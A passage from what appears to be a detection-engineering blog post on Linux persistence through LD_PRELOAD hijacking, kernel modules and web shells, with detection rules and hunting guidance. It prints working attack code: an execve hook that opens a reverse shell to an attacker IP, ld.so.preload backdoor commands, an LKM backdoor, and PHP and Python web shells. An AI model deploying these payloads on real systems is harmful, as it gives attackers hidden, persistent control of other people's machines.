linked program is executed, the process follows these steps:\n\n1. The dynamic linker loads the binary's [ELF](https://man7.org/linux/man-pages/man5/elf.5.html) (Executable and Linkable Format) header to determine the required libraries.\n2. It searches for the specified libraries in paths defined by:\n    1. Default system library paths.\n    2. Custom paths specified in `/etc/ld.so.conf` or environment variables like `LD_PRELOAD` and `LD_LIBRARY_PATH`.\n3. It maps the libraries into the program’s memory space and resolves symbols (e.g., function or variable references) required by the program.\n4. Execution is handed over to the program once all dependencies are resolved.\n\nDynamic Linker Hijacking occurs when an attacker manipulates the linking process to redirect execution flow. This can involve altering the library search order through `LD_PRELOAD`, modifying configuration files like `/etc/ld.so.conf`, or tampering with cached library mappings in `/etc/ld.so.cache`.\n\nMalware such as [HiddenWasp](https://sandflysecurity.com/blog/detecting-and-de-cloaking-hiddenwasp-linux-stealth-malware/), [Symbiote](https://intezer.com/blog/research/new-linux-threat-symbiote/), and open-source rootkits such as [Medusa](https://github.com/ldpreload/Medusa) and [Azazel](https://github.com/chokepoint/azazel) leverage this technique to establish persistence. MITRE ATT\u0026CK tracks this technique under the identifier [T1574.006](https://attack.mitre.org/techniques/T1574/006/).\n\n### T1574.006 - Dynamic Linker Hijacking: LD_PRELOAD\n\nThe `LD_PRELOAD` and `LD_LIBRARY_PATH` environment variables control how shared libraries are loaded by dynamically linked executables. Both are legitimate tools for debugging, profiling, and customizing application behavior, but they are also susceptible to abuse by attackers seeking to hijack the execution flow.\n\nThe `LD_PRELOAD` variable allows users to specify shared libraries that the dynamic linker should load before any others. This preloading ensures that functions or symbols in the specified libraries override those in standard or program-specified libraries. For instance, `LD_PRELOAD` is often used to test new implementations of library functions without modifying the application itself. For example:\n\n```\nLD_PRELOAD=/tmp/custom_library.so /bin/ls\n```\n\nIn this case, the dynamic linker will load `custom_library.so` before loading any other libraries required by `/bin/ls`, effectively replacing or augmenting its behavior. Running `ldd` this time shows a different output:\n\n```python\n\u003e ldd /bin/ls\n\nlinux-vdso.so.1 (0x00007fff87480000)\nlibc.so.6 =\u003e /lib/x86_64-linux-gnu/libc.so.6 (0x00007f235ff29000)\nlibcustom.so =\u003e /tmp/custom_library.so (0x00007f23ac7e5000)\n/lib64/ld-linux-x86-64.so.2 (0x00007f236034a000)\n```\n\nIndicating that the potentially malicious `custom_library.so` will be loaded prior to all others.\n\nThe `LD_LIBRARY_PATH` variable specifies directories for the dynamic linker to search when resolving shared libraries. This variable takes precedence over default library paths like `/lib/` and `/usr/lib/`, allowing users to override system libraries with custom versions located in alternate directories:\n\n```\nLD_LIBRARY_PATH=/tmp/custom_libs /bin/ls\n```\n\nHere, the dynamic linker will first search `/tmp/custom_libs` for the libraries required by `/bin/ls`. If a library is found there, it will be loaded instead of the default version.\n\nWhile both `LD_PRELOAD` and `LD_LIBRARY_PATH` can hijack the execution flow, they operate differently:\n\n* `LD_PRELOAD` directly specifies libraries to be loaded first, providing precise control over which functions are overridden.\n* `LD_LIBRARY_PATH` alters the library search path, potentially affecting multiple libraries and their dependencies.\n\nEnvironment variables can be set by regular users without requiring administrative access, making them a useful tool to hijack the execution flow without requiring root privileges. Setting environment variables is not persistent. To make the changes persistent across sessions, attackers can append these variables to the shell initialization files such as `~/.bashrc` or `~/.zshrc`. For example:\n\n```python\n\u003e echo 'export LD_PRELOAD=/tmp/malicious_library.so' \u003e\u003e ~/.bashrc\n\u003e echo 'export LD_LIBRARY_PATH=/tmp/custom_libs' \u003e\u003e ~/.bashrc\n```\n\nOn the next successful login, these variables will automatically be set, ensuring that the specified libraries are loaded whenever a dynamically linked executable is run. For more details, refer to the section on [shell profile modification](https://www.elastic.co/security-labs/primer-on-persistence-mechanisms#t1546004---event-triggered-execution-unix-shell-configuration-modification) in our [previous blog](https://www.elastic.co/security-labs/primer-on-persistence-mechanisms).\n\nWith root access, an attacker can edit the `/etc/ld.so.conf` file or add configuration fragments to `/etc/ld.so.conf.d/` to insert malicious library paths. By running `ldconfig`, they can ensure these libraries are cached and prioritized in the library search order for all users and applications. For example:\n\n```python\n# Create a malicious shared library\n\u003e mkdir /lib/malicious\n\u003e gcc -shared -o /lib/malicious/libhack.so -fPIC /tmp/hack.c\n\u003e cp malicious_libc.so /lib/malicious/libc.so.6\n\n# Add the malicious library path to /etc/ld.so.conf and reload\n\u003e echo \"/lib/malicious\" \u003e\u003e /etc/ld.so.conf\n\u003e ldconfig\n\n# Verify with ldd\n\u003e ldd /bin/ls\n\nlinux-vdso.so.1 (0x00007ffd2b1a5000)\nlibc.so.6 =\u003e /lib/malicious/libc.so.6 (0x00007f23ac7e5000) /lib64/ld-linux-x86-64.so.2 (0x00007f23ac6e0000)\n```\n\nThis output indicates that the malicious `libc.so.6` is now being loaded, hijacking the execution flow of `/bin/ls` and potentially any other application relying on `libc.so.6`. \n\nSimilarly, an attacker can manipulate the `/etc/ld.so.preload` file to force the dynamic linker to load a malicious shared library into every dynamically linked executable on the system. Unlike modifying the library search paths in `/etc/ld.so.conf`, this technique directly injects a library into the execution flow, overriding or augmenting critical functions across all applications. For example:\n\n```python\n# Create a malicious shared library\n\u003e gcc -shared -o /lib/malicious/libhack.so -fPIC hack.c\n\n# Add the malicious library to /etc/ld.so.preload\n\u003e echo \"/lib/malicious/libhack.so\" \u003e\u003e /etc/ld.so.preload\n\n# Verify with ldd\nldd /bin/ls\n\nlinux-vdso.so.1 (0x00007ffd2b1a5000)\nlibhack.so =\u003e /lib/malicious/libhack.so (0x00007f23ac7e5000)\n/lib64/ld-linux-x86-64.so.2 (0x00007f236034a000)\n```\n\nThe output shows that `libhack.so` is loaded before any other libraries. Since `/etc/ld.so.preload` affects all dynamically linked executables, the attack impacts every user and application.\n\nAdditionally, root access allows for more potential attack vectors, such as:\n\n* Overwriting legitimate libraries in `/lib/`, `/lib64/`, `/usr/lib/`, or `/usr/lib64/` with malicious versions.\n* Replacing and or modifying the dynamic linker binary (e.g. `ld-linux-x86-64.so.2`) to introduce backdoors or alter the library resolution process.\n* Modifying system-wide configuration files such as `/etc/profile` or `/etc/bash.bashrc` to globally set `LD_PRELOAD` or `LD_LIBRARY_PATH`.\n\n#### Persistence through T1574.006 - Dynamic Linker Hijacking: LD_PRELOAD\n\nLet’s examine how [PANIX](https://github.com/Aegrah/PANIX) leverages the dynamic linker hijacking technique within the [setup_ld_preload.sh](https://github.com/Aegrah/PANIX/blob/main/modules/setup_ld_preload.sh) module. This method relies on the presence of various compilation tools on the host system. PANIX hijacks the execution flow of the `execve` function for a user-specified binary, executing a backgrounded reverse shell whenever the binary is called:\n\n```c\n// Function pointer for the original execve\nint (*original_execve)(const char *pathname, char *const argv[], char *const envp[]);\n\n// Function to spawn a reverse shell in the background\nvoid spawn_reverse_shell() {\n\tpid_t pid = fork();\n\tif (pid == 0) { // Child process\n\t\tsetsid(); // Start a new session\n\t\tchar command[256];\n\t\tsprintf(command, \"/bin/bash -c 'bash -i \u003e\u0026 /dev/tcp/%s/%d 0\u003e\u00261'\", ATTACKER_IP, ATTACKER_PORT);\n\t\texecl(\"/bin/bash\", \"bash\", \"-c\", command, NULL);\n\t\texit(0); // Exit child process if execl fails\n\t}\n}\n\n// Hooked execve function\nint execve(const char *pathname, char *const argv[], char *const envp[]) {\n\t// Load the original execve function\n\tif (!original_execve) {\n\t\toriginal_execve = dlsym(RTLD_NEXT, \"execve\");\n\t\tif (!original_execve) {\n\t\t\texit(1);\n\t\t}\n\t}\n\n\t// Check if the executed binary matches the specified binary\n\tif (strstr(pathname, \"$binary\") != NULL) {\n\t\t// Spawn reverse shell in the background\n\t\tspawn_reverse_shell();\n\t}\n\n\t// Call the original execve function\n\treturn original_execve(pathname, argv, envp);\n}\n```\n\nTo load the malicious shared object, PANIX backdoors the `/etc/ld.so.preload` by default.\n\n```c++\n// Compile the shared object\ngcc -shared -fPIC -o $preload_lib $preload_source -ldl\nif [ $? -ne 0 ]; then\n\techo \"Compilation failed. Exiting.\"\n\texit 1\nfi\n\n// Add to /etc/ld.so.preload for persistence\nif ! grep -q \"$preload_lib\" \"$preload_file\" 2\u003e/dev/null; then\n\techo $preload_lib \u003e\u003e $preload_file\n\techo \"[+] Backdoor added to /etc/ld.so.preload for persistence.\"\nelse\n\techo \"[!] Backdoor already present in /etc/ld.so.preload.\"\nfi\n```\n\nLet’s run the module:\n\n```python\n\u003e sudo ./panix.sh --ld-preload --ip 192.168.1.1 --port 2016 --binary ls\n\nLD_PRELOAD source code created: /tmp/preload/preload_backdoor.c \nLD_PRELOAD shared object compiled successfully: /lib/preload_backdoor.so \n[+] Backdoor added to /etc/ld.so.preload for persistence. \n[+] Execute the binary ls to trigger the reverse shell.\n```\n\nWhen opening a session, we can see the malicious library injected into the execution flow:\n\n```python\n\u003e ldd $(which ls)                                                                      \n\nlinux-vdso.so.1 (0x00007ffe00fe8000) /lib/preload_backdoor.so (0x00007f610548e000)\nlibc.so.6 =\u003e /lib/x86_64-linux-gnu/libc.so.6 (0x00007f61052bb000)\nlibdl.so.2 =\u003e /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f61052b6000)\n/lib64/ld-linux-x86-64.so.2 (0x00007f61054a0000)\n```\n\nExecuting the `ls` command will spawn a reverse connection, while executing any other command, such as `whoami` will not. Let’s analyze the logs in Discover:\n\n![PANIX LD_PRELOAD module execution visualized in Kibana]( /assets/images/continuation-on-persistence-mechanisms/image2.png \"PANIX LD_PRELOAD module execution visualized in Kibana\")\n\nWe can see PANIX being executed, after which the temporary `preload_backdoor.c` source code is created in the `/tmp` directory. Next, `gcc` is used to compile the source code into a shared object and is added to the `/etc/ld.so.preload` file, which did not yet exist and is therefore created. After executing the `ls` binary, the backdoor is triggered, initializing a reverse connection on the specified IP and port.\n\nTo detect different activities along the chain, we have the following detection and endpoint rules in place:\n\n| Category | Coverage                                                       |\n|----------|----------------------------------------------------------------|\n| File     | [Dynamic Linker Creation or Modification](https://github.com/elastic/detection-rules/blob/86cc61c233c385064c4f16c0c88d2d9521c5dbdb/rules/linux/defense_evasion_dynamic_linker_file_creation.toml#L18)                        |\n|          | [Potential Persistence via File Modification](https://github.com/elastic/detection-rules/blob/86cc61c233c385064c4f16c0c88d2d9521c5dbdb/rules/integrations/fim/persistence_suspicious_file_modifications.toml#L20)                    |\n|          | [Shared Object Created or Changed by Previously Unknown Process](https://github.com/elastic/detection-rules/blob/86cc61c233c385064c4f16c0c88d2d9521c5dbdb/rules/linux/persistence_shared_object_creation.toml#L187) |\n|          | [Modification of Dynamic Linker Preload Shared Object](https://github.com/elastic/detection-rules/blob/main/rules/linux/privilege_escalation_ld_preload_shared_object_modif.toml)           |\n|          | [Creation of Hidden Shared Object File](https://github.com/elastic/detection-rules/blob/86cc61c233c385064c4f16c0c88d2d9521c5dbdb/rules/linux/defense_evasion_hidden_shared_object.toml#L10)                          |\n|          | [Dynamic Linker (ld.so) Creation](https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/defense_evasion_ld_so_creation.toml)                                |\n| Process  | [Dynamic Linker Copy](https://github.com/elastic/detection-rules/blob/86cc61c233c385064c4f16c0c88d2d9521c5dbdb/rules/linux/persistence_dynamic_linker_backup.toml#L2)                                            |\n|          | [Shared Object Injection via Process Environment Variable](https://github.com/elastic/protections-artifacts/blob/065efe897b511e9df5116f9f96b6cbabb68bf1e4/behavior/rules/linux/defense_evasion_shared_object_injection_via_process_environment_variable.toml)       |\n|          | [Unusual Preload Environment Variable Process Execution](https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/defense_evasion_unusual_preload_env_vars.toml)         |\n*Detection and endpoint rules that cover dynamic linker hijacking persistence*\n\nTo revert any changes made to the system by PANIX, you can use the corresponding revert module by running:\n\n```bash\n\u003e sudo ./panix.sh --revert ld-preload \n\n[+] Reverting ld-preload module...\n[+] Removing /lib/preload_backdoor.so from /etc/ld.so.preload...\n[+] Removed entry from /etc/ld.so.preload.\n[+] Removing malicious shared library /lib/preload_backdoor.so...\n[+] Removed /lib/preload_backdoor.so.\n[+] Removing temporary directory /tmp/preload...\n[+] Removed /tmp/preload.\n[!] Note: The backdoor may still be active in your current session.\n[!] Please restart your shell session to fully disable the backdoor.\n[!] Run 'exec bash' to start a new shell session.                                                                       \n\n\u003e exec bash \n```\n\n#### Hunting for T1574.006 - Dynamic Linker Hijacking: LD_PRELOAD \n\nOther than relying on detections, it is important to incorporate threat hunting into your workflow. This publication will solely list the available hunts for each persistence mechanism; however, more details regarding the basics of threat hunting are outlined in the “*Hunting for T1053 - scheduled task/job*” section of “*[Linux Detection Engineering -  A primer on persistence mechanisms](https://www.elastic.co/security-labs/primer-on-persistence-mechanisms)*”. Additionally, descriptions and references can be found in our [Detection Rules repository](https://github.com/elastic/detection-rules), specifically in the [Linux hunting subdirectory](https://github.com/elastic/detection-rules/tree/main/hunting).\n\nWe can hunt for this technique using [ES|QL](https://www.elastic.co/guide/en/elasticsearch/reference/current/esql.html) and [OSQuery](https://www.elastic.co/guide/en/kibana/current/osquery.html) by focusing on the misuse of dynamic linker environment variables like `LD_PRELOAD` and `LD_LIBRARY_PATH`. The approach includes monitoring for the following:\n\n* **Processes with suspicious environment variables:** Tracks processes with `LD_PRELOAD` and `LD_LIBRARY_PATH` set to unusual values.\n* **Creation of shared object (`.so`) files:** Observes `.so` files created in non-standard or uncommon directories, which could indicate malicious activity.\n* **Modifications to critical dynamic linker files:** Monitors changes to files like `/etc/ld.so.preload`, `/etc/ld.so.conf`, and associated directories such as `/etc/ld.so.conf.d/`.\n\nBy combining the [Persistence via Dynamic Linker Hijacking](https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/hunting/linux/docs/persistence_via_dynamic_linker_hijacking.md) hunting rule with the tailored detection queries listed above, analysts can effectively identify and respond to [T1574.006](https://attack.mitre.org/techniques/T1574/006/).\n\n## T1547.006 - Boot or Logon Autostart Execution: Kernel Modules and Extensions\n\n[Loadable Kernel Modules (LKMs)](https://man.openbsd.org/OpenBSD-5.1/lkm.4) provide a way to extend kernel functionality without modifying the core kernel itself. These modules can be dynamically loaded and unloaded at runtime, enabling features like hardware driver support, network protocol handling, and file system management.\n\nModules are typically stored in the `/lib/modules/` or `/usr/lib/modules/` directory followed by a subdirectory for the active kernel version and are organized into subdirectories based on their functionality, such as drivers or network protocols. To ensure an LKM is loaded on boot, the following configuration files are read:\n\n* `/etc/modules`\n* `/etc/modprobe.d/`\n* `/usr/lib/modprobe.d/`\n* `/etc/modules-load.d/`\n* `/run/modules-load.d/`\n* `/usr/local/lib/modules-load.d/`\n* `/usr/lib/modules-load.d/`\n\nManagement tools like `modprobe`, `insmod`, and `rmmod` are used to load, list, or unload modules.\n\nWhen an LKM is loaded, the following sequence occurs:\n\n1. User-space invocation:  \n  a. A user with sufficient privileges initiates the loading process using tools like `modprobe` or `insmod`.  \n2. Syscall invocation:  \n  a. `init_module()`: Loads a module from memory.  \n  b. `finit_module()`: Loads a module from a file descriptor.  \n3. Kernel validation:  \n  a. The kernel verifies the module's integrity, structure, and compatibility.  \n  b. Checks include validation of the ELF format and kernel version compatibility using metadata like `vermagic`.  \n4. Dependency Resolution:  \n  a. Tools like `depmod` generate dependency files that `modprobe` uses to load any required modules.  \n5. Initialization and integration:  \n  a. The module's initialization function is executed, integrating it with the kernel's functionality through exported symbols and interfaces.  \n\nNewer systems leverage `systemd` to invoke module loading during startup based on unit dependencies specified in service files. Older systems may still use scripts in `/etc/init.d/` or `/etc/rc.d/` to load modules at boot.\n\nThe kernel prioritizes modules based on their order in dependency files or init system configurations. The search and load process typically follows:\n\n1. Default paths specified in `/lib/modules/` or `/usr/lib/modules/`\n2. Overrides defined in `/etc/modprobe.d/` or `/usr/lib/modeprobe.d/`\n3. Kernel command-line parameters (e.g., `modprobe.blacklist`).\n\nThe flexibility and power of LKMs make them a double-edged sword, as they are not only indispensable for system functionality but also a potential vector for sophisticated threats, such as rootkits. MITRE tracks this technique under [T1547.006](https://attack.mitre.org/techniques/T1547/006/).\n\n### T1014 - Rootkit\n\nRootkits are a class of malicious software designed to conceal their presence and maintain persistent access to a system. They operate at various levels, from user-space applications to kernel-level modules. Kernel-level rootkits leverage LKMs, manipulating kernel behavior to hide processes, files, and network activity, making them difficult to detect.\n\nWhile rootkits are a broad and advanced topic, they are closely related to T1547.006 - Kernel Modules and Extensions. By modifying kernel structures or intercepting system calls, these rootkits can gain deep control over the system while remaining hidden from standard detection methods. MITRE tracks Rootkits specifically under [T1014](https://attack.mitre.org/techniques/T1014/).\n\n#### Future Work: T1014 - Rootkit\n\nRootkits are a vast topic deserving dedicated attention. In upcoming publications, we will explore:\n\n* The basics of rootkits.\n* Techniques for detecting and hunting rootkits.\n* Real-world examples of rootkit attacks and defenses.\n\nFor now, understanding how LKMs are used as a vector for kernel rootkits bridges the gap between T1547.006 - Kernel Modules and Extensions and the broader topic of rootkits. This blog lays the groundwork for the in-depth exploration of rootkits to come.\n\nCan’t wait to learn more about rootkits? Read our recent research, “*[Declawing PUMAKIT](https://www.elastic.co/security-labs/declawing-pumakit)*”, a sophisticated LKM rootkit that employs mechanisms to hide its presence and maintain communication with its C2 servers.\n\n#### Persistence through T1547.006 - Kernel Modules and Extensions\n\nWhile T1547.006 and T1014 share some overlap, PANIX includes two distinct modules: one for a basic LKM and another for a fully implemented rootkit. We’ll begin with the simple LKM using the [setup_lkm.sh](https://github.com/Aegrah/PANIX/blob/main/modules/setup_lkm.sh) module for T1547. As before, this module requires kernel headers and compilation tools to be available on the host. \n\nThe LKM being created is a simple module that spawns a separate thread to execute a specified command. Once the command is executed, the thread enters a sleep state for 60 seconds before repeating the process in an infinite while loop.\n\n```c\n#include \u003clinux/module.h\u003e\n#include \u003clinux/kernel.h\u003e\n#include \u003clinux/init.h\u003e\n#include \u003clinux/kthread.h\u003e\n#include \u003clinux/delay.h\u003e\n#include \u003clinux/signal.h\u003e\n\nstatic struct task_struct *task;\n\nstatic int backdoor_thread(void *arg) {\n\tallow_signal(SIGKILL);\n\twhile (!kthread_should_stop()) {\n\t\tchar *argv[] = {$command};\n\t\tcall_usermodehelper(argv[0], argv, NULL, UMH_WAIT_PROC);\n\t\tssleep(60);\n\t}\n\treturn 0;\n}\n\nstatic int __init lkm_backdoor_init(void) {\n\tprintk(KERN_INFO \"Loading LKM backdoor module\\\\n\");\n\ttask = kthread_run(backdoor_thread, NULL, \"lkm_backdoor_thread\");\n\treturn 0;\n}\n\nstatic void __exit lkm_backdoor_exit(void) {\n\tprintk(KERN_INFO \"Removing LKM backdoor module\\\\n\");\n\tif (task) {\n\t\tkthread_stop(task);\n\t}\n}\n\nmodule_init(lkm_backdoor_init);\nmodule_exit(lkm_backdoor_exit);\n\nMODULE_LICENSE(\"GPL\");\nMODULE_AUTHOR(\"PANIX\");\nMODULE_DESCRIPTION(\"LKM Backdoor\");\n```\n\nAfter compilation with `make` and `gcc`, it copies the LKM to `/lib/modules/$(uname -r)/kernel/drivers/${lkm_name}.ko` and executes the `sudo insmod ${lkm_destination}` to load the module. The `$(uname -r)` command ensures that the path corresponding to the active kernel version is resolved.\n\nLet’s run the module:\n\n```bash\n\u003e sudo ./panix.sh --lkm --default --ip 192.168.1.1 --port 2017\n\n[+] Kernel module source code created: /tmp/lkm/panix.c\n[+] Makefile created: /tmp/lkm/Makefile \n[+] Kernel module compiled successfully: /lib/modules/4.19.0-27-amd64/kernel/drivers/panix.ko\n[+] Adding kernel module to /etc/modules, /etc/modules-load.d/ and /usr/lib/modules-load.d/...\n[+] Kernel module loaded successfully. Check dmesg for the output.\n[+] Kernel module added to /etc/modules, /etc/modules-load.d/ and /usr/lib/modules-load.d/\n[+] LKM backdoor established! \n```\n\nTaking a look at the remnants left behind in Discover, we can see:\n\n![PANIX LKM module execution visualized in Kibana]( /assets/images/continuation-on-persistence-mechanisms/image5.png \"PANIX LKM module execution visualized in Kibana\")\n\nPANIX is executed, initiating the compilation process for the LKM using `make`, ensuring it is built for the active kernel version. Once compiled, the resulting `panix.ko` module is placed in the appropriate module library directory for the current kernel. To achieve persistence across reboots, a configuration file named `panix.conf` is created in both `/etc/modules-load.d/` and `/usr/lib/modules-load.d/`. The module is then loaded into the kernel using the `insmod` command, activating the reverse shell. Leveraging the Auditd Manager integration, we can observe the `kmod` utility loading the `panix` kernel module.\n\nThis technique can leave behind several traces. The following detection- and endpoint rules are in place to effectively detect these:\n\n| Category | Coverage                                           |\n|----------|----------------------------------------------------|\n| Driver   | [Kernel Driver Load](https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/persistence_kernel_driver_load.toml)                                 |\n|          | [Kernel Driver Load by non-root User](https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/persistence_kernel_driver_load_by_non_root.toml)                |\n| File     | [Loadable Kernel Module Configuration File Creation](https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/persistence_lkm_configuration_file_creation.toml) |\n|          | [Kernel Object File Creation](https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/persistence_kernel_object_file_creation.toml)                        |\n| Process  | [Kernel Module Load via insmod](https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/persistence_insmod_kernel_module_load.toml)                      |\n|          | [Kernel Module Removal](https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/defense_evasion_kernel_module_removal.toml)                              |\n|          | [Enumeration of Kernel Modules](https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/discovery_kernel_module_enumeration.toml)                      |\n|          | [Attempt to Clear Kernel Ring Buffer](https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/defense_evasion_clear_kernel_ring_buffer.toml)                |\n|          | [Kernel Load or Unload via Kexec Detected](https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/privilege_escalation_load_and_unload_of_kernel_via_kexec.toml)           |\n| Syslog   | [Tainted Kernel Module Load](https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/persistence_tainted_kernel_module_load.toml)                         |\n|          | [Tainted Out-Of-Tree Kernel Module Load](https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/persistence_tainted_kernel_module_out_of_tree_load.toml)             |\n*Detection and endpoint rules that cover loadable kernel module persistence*                                                                  |\n\nFor more information on how to set up the Auditd Manager integration to capture driver events and much more, check out the [Linux Detection Engineering with Auditd](https://www.elastic.co/security-labs/linux-detection-engineering-with-auditd) publication.\n\nWe can revert this module by executing the following command:\n\n```bash\n\u003e sudo ./panix.sh --revert lkm\n\n###### [+] Reverting lkm module... #####\n\n[+] Unloading kernel module 'panix'...\n[+] Kernel module 'panix' unloaded successfully.\n[+] Removing kernel module file '/lib/modules/4.19.0-27-amd64/kernel/drivers/panix.ko'...\n[+] Kernel module file '/lib/modules/4.19.0-27-amd64/kernel/drivers/panix.ko' removed successfully.\n[+] Removing temporary directory '/tmp/lkm'...\n[+] Temporary directory '/tmp/lkm' removed successfully.\n[+] Removing panix from /etc/modules, /etc/modules-load.d/ and /usr/lib/modules-load.d/...\n[+] Updating module dependencies...\n[+] Module dependencies updated.\n```\n\n#### Hunting for T1547.006 - Kernel Modules and Extensions\n\nWe can hunt for this technique using ES|QL and OSQuery, focusing on suspicious kernel module activity, including the creation of `.ko` files, execution of kernel module management tools, and modifications to kernel module configuration files. The hunting approach includes:\n\n* **Monitoring kernel module file creation:** Tracks `.ko` file creations in non-standard directories to detect potentially malicious modules.\n* **Identifying unusual module management executions:** Monitors processes such as `kmod`, `modprobe`, `insmod`, and `rmmod` for suspicious or uncommon arguments.\n* **Detecting changes to configuration files:** Observes files like `/etc/modprobe.d/`, `/etc/modules`, and related directories for modifications that might enable persistence.\n* **Focus on rare drivers:** Use queries that identify kernel modules loaded via `init_module` or `finit_module` syscalls that occur infrequently.\n\nBy combining the [Persistence via Loadable Kernel Modules](https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/hunting/linux/docs/persistence_via_loadable_kernel_modules.md) and [Drivers Load with Low Occurrence Frequency](https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/hunting/linux/docs/persistence_via_driver_load_with_low_occurrence_frequency.md) hunting rules, along with tailored detection queries, analysts can effectively identify [T1547.006](https://attack.mitre.org/techniques/T1547/006/)-related activity.\n\n\n## T1505.003 - Server Software Component: Web Shell\n\nA web shell is a malicious script uploaded to a web server, enabling attackers to execute arbitrary commands on the host. They are commonly deployed after exploiting vulnerabilities in server software, weak file upload restrictions, or misconfigurations. Web shells are typically small scripts written in commonly supported languages such as PHP, Python, or Perl. This activity is tracked by MITRE under [T1505.003](https://attack.mitre.org/techniques/T1505/003/).\n\n### T1505.003 - Web Shell - PHP \u0026 Python\n\nWeb shells often integrate seamlessly with web server configurations like `Apache`, `Nginx`, or `Lighttpd`. These scripts can be categorized into two primary types: command execution (CMD) and reverse shell web shells.\n\n**1. Command shells**\n\nCMD web shells provide a simple interface to execute system commands through a browser or remote tool. A typical PHP CMD web shell might look like this:\n\n```php\n\u003c?php\nif (isset($_GET['cmd'])) {\n    echo shell_exec($_GET['cmd']);\n}\n?\u003e\n```\n\n**2. Reverse shells**\n\nReverse shell web shells establish an outbound connection from the compromised server to the attacker’s machine. An example PHP reverse shell:\n\n```php\n\u003c?php\n$ip = '192.168.1.100'; // Attacker IP\n$port = 4444;          // Attacker Port\n$socket = fsockopen($ip, $port);\nexec(\"/bin/sh -i \u003c\u00263 \u003e\u00263 2\u003e\u00263\");\n?\u003e\n```\n\nThe attacker runs a listener on their machine using `Netcat` or any other listener. When the shell script is accessed, it connects to the attacker, providing an interactive session.\n\n**Leveraging the Common Gateway Interface (CGI) for web shells**\n\nThe [Common Gateway Interface (CGI)](https://www.ibm.com/docs/en/i/7.4?topic=functionality-cgi) allows web servers to execute external scripts and return their output to clients. Attackers can use CGI scripts to execute commands in various languages, including Python, Bash, and Perl. A Python CGI web shell example:\n\n```python\n#!/usr/bin/env python3\nimport cgi\nimport os\n\nprint(\"Content-type: text/html\\n\\n\")\nform = cgi.FieldStorage()\ncommand = form.getvalue(\"cmd\")\nif command:\n    output = os.popen(command).read()\n    print(output)\n```\n\nCGI scripts offer versatility and can be used in environments where PHP or other web shells might be restricted.\n\nAttackers often target web root directories like `/var/www/html/` to upload their web shells. Weak file upload restrictions or misconfigured permissions allow them to place malicious scripts. To enhance persistence, attackers may:\n\n* **Embed Web Shells in Existing Files**: Modify legitimate files to include web shell code, making detection more challenging.\n* **Use Built-in Web Servers**: Attackers can start a web server in a specific directory to bypass restrictions\n* **Leverage Hidden Directories**: To avoid detection, locate web shells in obscure or hidden directories.\n\nAlthough this type of implementation is also possible for languages other than PHP and Python, they commonly require modules/plugins to be installed, making them a less viable option. The following section will explore detailed examples of these methods and their corresponding detection strategies.\n\n\n#### Persistence through T1505.003 - Web Shell: PHP \u0026 Python\n\nLet’s examine how PANIX leverages PHP, Python, and CGI to establish web shell backdoors within the [setup_web_shell.sh](https://github.com/Aegrah/PANIX/blob/ae404d5caf74c772436ccaaa0c3ab51cba8c4250/modules/setup_web_shell.sh) module. Refer to the module to inspect the full payloads.\n\nDepending on permissions, PANIX creates a web server in `/var/www/html/` (root) or `$HOME/` (non-root). PHP uses the `-S` flag to start a lightweight server, with `-t` specifying the root directory to serve the web shells. For Python, the `-m http.server` module is combined with `--cgi` to enable dynamic execution of CGI scripts. If only Python 2 is available, PANIX falls back to `-m CGIHTTPServer` for compatibility.\n\nServers are launched in the background using `nohup` to ensure persistence, remaining active even after the user logs out.\n\nLet’s look at what traces we can detect within these chains, starting with a PHP CMD shell. To simulate this activity, we can use the following PANIX command:\n\n```bash\n\u003e ./panix.sh --web-shell --language php --mechanism cmd --port 8080\n\n[+] Web server directory created at /home/ruben/panix/\n[+] cmd.php file created in /home/ruben/panix/\n[+] Interact via: curl http://\u003cip\u003e:8080/cmd.php?cmd=whoami\n[!] Starting PHP server on port 8080...\n[+] PHP server running in the background at port 8080.\n[!] In case you cannot connect, ensure your firewall settings are allowing inbound traffic on port 8080.\n\nRun the following commands in case of issues on RHEL/CentOS systems:\n\nsudo firewall-cmd --add-port=8080/tcp --permanent\nsudo firewall-cmd --reload\n```\n\nAfter execution, we can call the `cmd.php` through the following `curl` command:\n\n```bash\n\u003e curl http://192.168.1.100:8080/cmd.php?cmd=whoami\nruben\n```\n\nExecuting the payload generates the following documents in Kibana:\n\n![PANIX web-shell module execution visualized in Kibana (command shell payload)]( /assets/images/continuation-on-persistence-mechanisms/image3.png \"PANIX web-shell module execution visualized in Kibana (command shell payload)\")\n\nThe figure above shows PANIX being executed and the `/home/ruben/panix/` directory being created (as PANIX is executed with user privileges). The `cmd.php` file is created, and the PHP web shell is spawned with the `-S` flag and listens on all interfaces (`0.0.0.0`) on port 8080. Upon execution of the `curl` command from the attack host, we can see a `connection_accepted`, followed by the execution of the `whoami` command, followed by a `disconnect_received`. \n\nTo simulate reverse shell behavior, we can simulate a Python reverse shell through the following PANIX command:\n\n```bash\n./panix.sh --web-shell --language python --mechanism reverse --port 8080 --rev-port 2018 --ip 192.168.1.100\n\n[+] Web server directory created at /home/ruben/panix/\n[+] reverse.py file created in /home/ruben/panix/cgi-bin/\n[+] Interact via: curl http://\u003cip\u003e:8080/cgi-bin/reverse.py\n[!] Starting Python3 server on port 8080 with CGI enabled...\n[+] Python3 server running in 